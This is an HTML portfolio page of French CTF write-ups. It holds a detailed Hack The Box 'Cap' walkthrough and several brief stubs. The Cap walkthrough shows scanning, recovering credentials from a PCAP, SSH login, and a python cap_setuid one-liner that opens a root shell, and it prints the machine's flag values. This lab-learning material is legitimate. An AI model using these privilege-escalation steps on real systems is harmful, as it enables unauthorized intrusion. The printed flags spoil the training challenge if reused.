<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fr3nch4Sec - Writeups CTF</title>
    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Hack:wght@400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style/style.css"> <!-- Chemin dans dossier style/ -->
    <!-- Highlight.js neutre -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css" id="highlight-theme">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <style>
        /* Styles pour accord√©on moderne (am√©lior√© pour √©viter clips) */
        .writeup-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.5s ease-out, padding 0.3s ease-out; /* Transition plus douce */
            padding: 0 15px;
        }
        .writeup-content.open {
            max-height: none; /* Pas de limite fixe pour √©viter coupures */
            overflow: visible; /* Visible complet quand ouvert */
            padding: 15px;
        }
        .clickable {
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            position: relative;
            user-select: none;
        }
        .clickable::after {
            content: '+';
            font-size: 1.5em;
            font-weight: bold;
            position: absolute;
            right: 0;
            transition: transform 0.3s ease;
        }
        .clickable.open::after {
            content: '‚àí';
            transform: rotate(180deg);
        }
        .clickable:hover {
            color: var(--accent-color, #4a7043);
        }
        /* Fix pour code blocks (anti-saccad√© et visibilit√© lignes shell) */
        .writeup-content pre {
            white-space: pre-wrap; /* Wrap lignes longues sans saccades */
            line-height: 1.4; /* Espacement uniforme pour lignes shell */
            margin: 15px 0 !important; /* Espace au-dessus/en-dessous pour √©viter chevauchement */
            overflow-x: auto;
            overflow-y: visible; /* Toutes les lignes visibles */
            display: block;
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Hack', monospace;
            font-size: 0.9em; /* L√©g√®rement plus petit pour lisibilit√© */
        }
        .writeup-content code {
            line-height: 1.4; /* Uniformit√© */
            white-space: pre-wrap;
            margin: 0;
        }
        .writeup-content pre code {
            display: block;
            padding: 0;
            margin: 0;
            white-space: pre-wrap; /* Assure wrap dans Highlight.js */
        }
        /* √âvite chevauchement avec texte adjacent */
        .writeup-content h3, .writeup-content p {
            margin-bottom: 10px;
        }
        .writeup-content > *:first-child {
            margin-top: 0;
        }
    </style>
</head>
<body class="dark-mode">
    <button id="theme-toggle" aria-label="Basculer mode jour/nuit">
        <span class="theme-icon">üåô</span>
    </button>
    <h1>üìÇ Writeups CTF</h1>
    <p>Voici mes writeups organis√©s par plateforme :</p>
    <div class="writeup-list" id="writeupList">
        <!-- Section Hack The Box -->
        <div class="platform-section">
            <h2>Hack The Box</h2>
            <div class="writeup-item">
                <h2 class="clickable">Cap Machine - Easy</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# HackTheBox - Cap Machine - Easy

1. **Reconnaissance**  
### Scan des ports  
Le Firewall de la machine bloque les scans basiques, avec transaction 'SynAck' compl√®te.  
J'utilise Naabu en premier avec Nmap sur chaque machine, car c'est super rapide.  
Donc, j'ai utilis√© le flag `-sS` dans Nmap, pour initier la connexion avec l'envoi de paquets. Si Nmap re√ßoit la r√©ponse, le port est consid√©r√© comme ouvert.  
```bash
sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v'
```
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    gunicorn  

### Fuzzing de l'url avec Ffuf et Gobuster:  
```bash
ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1
```  
```bash
ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt
```  
#### R√©sultats obtenus:  
/ip  
/netstat  
/data  

### Ensuite:  
J'ai poursuivi la recherche de domaines et d'extensions potentielles.  
Apr√®s un fuzzing par r√©cursion, j'ai trouv√© une page √† '/data/0'.  
Cette page permet de t√©l√©charger un fichier PCAP, li√© √† l'utilisateur.  
Chose bizarre. La page √©tait li√©e au m√™me utilisateur mais les donn√©es pr√©sentes dans le PCAP diff√©raient l√©g√®rement.  
Pendant le fuzzing du domaine, le snapshot indiquait z√©ro en termes de paquets √† chaque type (TCP, UDP, etc.).  
J'ai t√©l√©charg√© les PCAP √† plusieurs reprises pour les comparer.  
Je les ai inspect√©s avec Wireshark sans r√©sultats. √Ä premi√®re vue en tout cas.  
J'ai trouv√© sur des forums, des docs et autres, comment filtrer les donn√©es. Car oui, je pratique peu Wireshark.  
J'ai donc lanc√© 'Protocol Hierarchy' sur le protocole FTP.  

En examinant les en-t√™tes, le mot de passe s'affiche directement. Et l'utilisateur, dans un paquet avec une IP li√©e √† celui contenant le mot de passe.  

<link href="style.css" rel="stylesheet" />
<style>
  img {
    width: 100%;
    max-width: 500px;
    height: auto;
  }
</style>
<img src="https://github.com/Fr3nch4Sec/fr3nch4.github.io/blob/main/images/Cap_img_1.webp" alt="Vue de Wireshark" />










                        
2. **Exploitation** :  
#### Connexion SSH avec id & password  
Je me suis servi de ce mot de passe afin de me connecter via SSH, avec l'utilisateur 'nathan'.  

```bash
ssh nathan@10.10.10.245
```  
On est dans la machine. üñ•Ô∏èüñ•Ô∏è  

J'ai t√©l√©charg√© Linpeas ü§î  

```bash
nathan@cap:~$ ls
e.py  linpeas  linpeas.sh  snap  user.txt
nathan@cap:~$ cat user.txt
d2ee7e0a3b896efed8eeeeab2aeb1ff6
nathan@cap:~/snap/bin$ ls
Makefile  cve  cve-2021-4034.c  esc  exploit_nss.py  ls polkit  pwnkit.c
```  
J'ai rendu Linpeas ex√©cutable, et l'ai lanc√©.  
```bash
chmod +x linpeas
chmod +x linpeas.sh
./linpeas
./linpeas.sh
```  
Linpeas a indiqu√© dans la sortie que Python 3 disposait de la fonction 'cap_setuid' qui peut modifier l'UID d'un processus:  
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`  
```bash
nathan@cap:~$ ls
snap user.txt
nathan@cap:~$ cat user.txt
bd615fdf252a03b75214aebaa4cb0714
```  

3. **Acc√®s root** : Escalade de privil√®ges via la cr√©ation d'un fichier SUID.  
J'ai cherch√© sur l'extension Hacktools, sur des writeups, pour trouver comment √©lever les privil√®ges depuis un 'user' Linux.  
J'en ai essay√© plusieurs:  
Cette commande m'a permis de passer de User √† Root.  

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```  
```bash
root@cap:~# ls
snap user.txt
root@cap:~# cd /root
root@cap:/root# ls
root.txt snap
root@cap:/root# cat root.txt
b17a06939691f0e4f924f37138c32eeb
root@cap:/root#
```  


<link href="style.css" rel="stylesheet" />
<style>
  img {
    width: 100%;
    max-width: 500px;
    height: auto;
  }
</style>
<img src="https://github.com/Fr3nch4Sec/fr3nch4.github.io/blob/main/images/Cap_img_2.webp" alt="√âlevation de privil√®ges" />














                        
                        
### Conclusion  
Une excellente machine pour apprendre les bases de l'√©num√©ration et de l'exploitation simple.
                    </script>
                </div>
            </div>
            <div class="writeup-item">
                <h2 class="clickable">Machine Basique</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# HackTheBox - Machine Basique  
## Introduction  
Ce writeup d√©crit la r√©solution de la machine "Basique" sur HackTheBox. L'objectif √©tait de d√©couvrir les services expos√©s et d'exploiter une faille simple.  
## √âtapes  
1. **Scan initial** : Utilisation de `nmap` pour identifier les ports ouverts.  
```bash  
nmap -sC -sV -oA scan 10.10.10.10  
```  
2. **Exploitation** : D√©couverte d'une vuln√©rabilit√© dans un service web.  
3. **Acc√®s root** : Escalade de privil√®ges via un fichier de configuration mal s√©curis√©.  
## Conclusion  
Cette machine √©tait un excellent exercice pour les d√©butants en pentest.
                    </script>
                </div>
            </div>
        </div>
        <!-- Section TryHackMe -->
        <div class="platform-section">
            <h2>TryHackMe</h2>
            <div class="writeup-item">
                <h2 class="clickable">Machine Easy & Medium</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# TryHackMe - Machine Easy & Medium  
## Introduction  
Ce writeup couvre une machine TryHackMe combinant des √©l√©ments faciles et moyens, avec un focus sur l'√©num√©ration et l'exploitation web.  
## √âtapes  
1. **√ânum√©ration** : Scan des ports et services.  
```bash  
nmap -sV -sC 10.10.10.10  
```  
2. **Exploitation** : Vuln√©rabilit√© dans un CMS mal configur√©.  
3. **Post-exploitation** : Recherche de flags et escalade de privil√®ges.  
## Conclusion  
Un bon challenge pour consolider les bases du pentest.
                    </script>
                </div>
            </div>
        </div>
        <!-- Section Root-Me -->
        <div class="platform-section">
            <h2>Root-Me</h2>
            <div class="writeup-item">
                <h2 class="clickable">Challenge Forensic</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# Root-Me - Challenge Forensic  
## Introduction  
Ce challenge portait sur l'analyse d'une image m√©moire avec Volatility pour extraire des informations sensibles.  
## √âtapes  
1. **Analyse m√©moire** : Utilisation de Volatility pour lister les processus.  
```bash  
volatility -f memory.dump pslist  
```  
2. **Extraction** : R√©cup√©ration d'un mot de passe dans un dump m√©moire.  
3. **Validation** : Soumission du flag obtenu.  
## Conclusion  
Une bonne introduction √† l'analyse forensique avec Volatility.
                    </script>
                </div>
            </div>
        </div>
        <!-- Section FCSC -->
        <div class="platform-section">
            <h2>FCSC</h2>
            <div class="writeup-item">
                <h2 class="clickable">Cryptobro</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# FCSC 2025 - Cryptobro  
## Introduction  
Ce challenge combinait cryptographie et analyse forensique, avec un fichier `.npy` √† analyser.  
## √âtapes  
1. **Analyse du fichier** : Utilisation de NumPy pour charger le fichier `.npy`.  
```python  
import numpy as np  
data = np.load('challenge.npy')  
```  
2. **D√©codage** : Identification d'un message chiffr√© dans les donn√©es.  
3. **D√©cryptage** : Application d'une m√©thode de d√©chiffrement pour extraire le flag.  
## Conclusion  
Un challenge int√©ressant qui m√™le plusieurs disciplines.
                    </script>
                </div>
            </div>
        </div>
    </div>
    <a href="index.html" class="back-link">‚¨Ö Retour au portfolio</a>
    <script>
        // Config Marked pour highlight
        marked.setOptions({
          highlight: function(code, lang) {
            if (hljs.getLanguage(lang)) {
              return hljs.highlight(code, { language: lang }).value;
            }
            return hljs.highlightAuto(code).value;
          }
        });
        // Parsing Markdown et accord√©on
        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('.writeup-item').forEach(item => {
                const contentDiv = item.querySelector('.writeup-content');
                const markdownScript = contentDiv.querySelector('script[type="text/markdown"]');
                if (markdownScript) {
                    contentDiv.innerHTML = marked.parse(markdownScript.textContent);
                    // Re-highlight apr√®s parsing pour appliquer styles fix√©s
                    hljs.highlightAll();
                }
                const title = item.querySelector('h2.clickable');
                title.addEventListener('click', () => {
                    const isOpen = contentDiv.classList.contains('open');
                    // Ferme les autres pour mode unique
                    document.querySelectorAll('.writeup-content.open').forEach(other => {
                        if (other !== contentDiv) {
                            other.classList.remove('open');
                            other.parentElement.querySelector('.clickable').classList.remove('open');
                        }
                    });
                    contentDiv.classList.toggle('open', !isOpen);
                    title.classList.toggle('open', !isOpen);
                    // Re-highlight si ouvert (pour visibilit√©)
                    if (!isOpen) {
                        setTimeout(() => hljs.highlightAll(), 100);
                    }
                });
            });
        });
        // Toggle th√®me (coh√©rent avec index)
        document.addEventListener('DOMContentLoaded', () => {
            const toggle = document.getElementById('theme-toggle');
            const icon = toggle.querySelector('.theme-icon');
            const highlightTheme = document.getElementById('highlight-theme');
            const isDark = localStorage.getItem('theme') === 'dark';
            if (isDark) {
                document.body.classList.add('dark-mode');
                document.body.classList.remove('light-mode');
                icon.textContent = '‚òÄÔ∏è';
                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
            } else {
                document.body.classList.add('light-mode');
                document.body.classList.remove('dark-mode');
                icon.textContent = 'üåô';
                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
            }
            toggle.addEventListener('click', () => {
                toggle.classList.add('clicked');
                setTimeout(() => toggle.classList.remove('clicked'), 300);
                document.body.classList.toggle('dark-mode');
                document.body.classList.toggle('light-mode');
                const isDarkNow = document.body.classList.contains('dark-mode');
                icon.textContent = isDarkNow ? '‚òÄÔ∏è' : 'üåô';
                highlightTheme.href = isDarkNow
                    ? 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css'
                    : 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
                localStorage.setItem('theme', isDarkNow ? 'dark' : 'light');
                // Re-highlight apr√®s changement th√®me
                setTimeout(() => hljs.highlightAll(), 100);
            });
        });
    </script>
</body>
</html>






